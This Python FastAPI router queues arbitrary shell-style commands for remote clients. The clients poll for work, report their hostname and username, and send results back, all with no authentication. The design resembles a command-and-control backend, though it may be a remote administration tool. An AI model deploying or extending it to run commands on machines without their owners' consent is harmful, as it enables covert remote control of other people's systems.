from fastapi import APIRouter
from routers.clients import command_queue
from routers.client_registry import update_client_status
from pydantic import BaseModel
from typing import Dict, Optional
import uuid
import time

router = APIRouter()

# Command tracking structures
class CommandInfo(BaseModel):
    command_id: str
    stable_id: str
    command: str
    timestamp: float
    status: str  # 'pending', 'executing', 'completed', 'failed'
    result: Optional[str] = None
    result_timestamp: Optional[float] = None

class CommandResult(BaseModel):
    command_id: str
    result: str
    status: str  # 'completed', 'failed'

# Global storage
command_history: Dict[str, CommandInfo] = {}
pending_commands: Dict[str, str] = {}  # stable_id -> command_id

@router.get("/next_command")
def get_next_command(client_id: str, hostname: str = None, username: str = None):
    # client_id 現在是 stable_id
    stable_id = client_id
    
    # 更新客戶端狀態（如果提供了環境資訊）
    if hostname and username:
        stable_id = update_client_status(client_id, hostname, username)
    
    if stable_id not in command_queue:
        # 自動註冊新的 stable_id
        command_queue[stable_id] = None
        print(f"Auto-registered stable ID: {stable_id}")
    
    command = command_queue[stable_id]
    if command:
        # 清除已發送的指令
        command_queue[stable_id] = None
        
        # Get command_id for this command
        command_id = pending_commands.get(stable_id)
        if command_id and command_id in command_history:
            # Update status to executing
            command_history[command_id].status = 'executing'
            print(f"Sending command to {stable_id}: {command} (ID: {command_id})")
            return {"command": command, "command_id": command_id}
        else:
            print(f"Sending command to {stable_id}: {command} (no ID)")
            return {"command": command}
    
    return {"command": None}

@router.post("/send_command")
def send_command(client_id: str, command: str):
    # client_id 現在是 stable_id
    stable_id = client_id
    
    if stable_id not in command_queue:
        # 自動註冊新的 stable_id
        command_queue[stable_id] = None
        
    # Generate command ID and store command info
    command_id = str(uuid.uuid4())
    timestamp = time.time()
    
    command_info = CommandInfo(
        command_id=command_id,
        stable_id=stable_id,
        command=command,
        timestamp=timestamp,
        status='pending'
    )
    
    command_history[command_id] = command_info
    pending_commands[stable_id] = command_id
    command_queue[stable_id] = command
    
    return {
        "status": f"Command queued for {stable_id}",
        "command_id": command_id,
        "timestamp": timestamp
    }

@router.post("/submit_result")
def submit_result(result_data: CommandResult):
    """Submit command execution result"""
    command_id = result_data.command_id
    
    if command_id not in command_history:
        return {"error": f"Command ID {command_id} not found"}
    
    # Update command info with result
    command_info = command_history[command_id]
    command_info.result = result_data.result
    command_info.status = result_data.status
    command_info.result_timestamp = time.time()
    
    # Clear pending command for this client
    stable_id = command_info.stable_id
    if stable_id in pending_commands and pending_commands[stable_id] == command_id:
        del pending_commands[stable_id]
    
    print(f"Result received for {command_id}: {result_data.status}")
    return {"status": "Result submitted successfully", "command_id": command_id}

@router.get("/get_result/{command_id}")
def get_result(command_id: str):
    """Get command execution result by command ID"""
    if command_id not in command_history:
        return {"error": f"Command ID {command_id} not found"}
    
    return command_history[command_id]

@router.get("/command_history")
def get_command_history(stable_id: str = None, limit: int = 50):
    """Get command history, optionally filtered by stable_id"""
    history = list(command_history.values())
    
    if stable_id:
        history = [cmd for cmd in history if cmd.stable_id == stable_id]
    
    # Sort by timestamp (newest first)
    history.sort(key=lambda x: x.timestamp, reverse=True)
    
    return {
        "commands": history[:limit],
        "total": len(history)
    }